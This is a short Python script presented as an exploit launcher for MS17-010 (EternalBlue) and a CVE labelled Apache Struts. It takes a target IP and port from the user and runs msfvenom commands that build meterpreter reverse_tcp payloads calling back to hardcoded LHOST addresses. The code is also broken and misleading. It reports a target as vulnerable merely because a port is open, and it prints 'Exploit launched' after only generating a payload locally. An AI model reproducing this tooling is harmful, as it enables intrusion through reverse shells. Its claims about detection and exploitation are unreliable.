import os
import socket
import subprocess

exploits = {
    "MS17-010": {
        "vuln": "EternalBlue",
        "os": "Windows",
        "arch": "x86",
        "payload": "windows/meterpreter/reverse_tcp"
    },
    "CVE-2020-1234": {
        "vuln": "Apache Struts",
        "os": "Linux",
        "arch": "x64",
        "payload": "linux/x64/meterpreter/reverse_tcp"
    }
}

def scan_target(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.close()
        return True
    except socket.error:
        return False

def generate_payload(exploit_name):
    payload = exploits[exploit_name]["payload"]
    if payload == "windows/meterpreter/reverse_tcp":
        return "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=4444 -f exe"
    elif payload == "linux/x64/meterpreter/reverse_tcp":
        return "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf"
    else:
        return None

def launch_exploit(target_ip, exploit_name):
    payload_cmd = generate_payload(exploit_name)
    if payload_cmd:
        subprocess.call(payload_cmd, shell=True)
        print(f"Exploit launched against {target_ip} using {exploit_name}")
    else:
        print(f"Error generating payload for {exploit_name}")

target_ip = input("Enter Target IP : ")      # Target IP
target_port = int(input("Enter Target Port : "))

if scan_target(target_ip, target_port):
    print(f"Target {target_ip} is vulnerable to MS17-010")
    launch_exploit(target_ip, "MS17-010")
else:
    print(f"Target {target_ip} is not vulnerable to MS17-010")
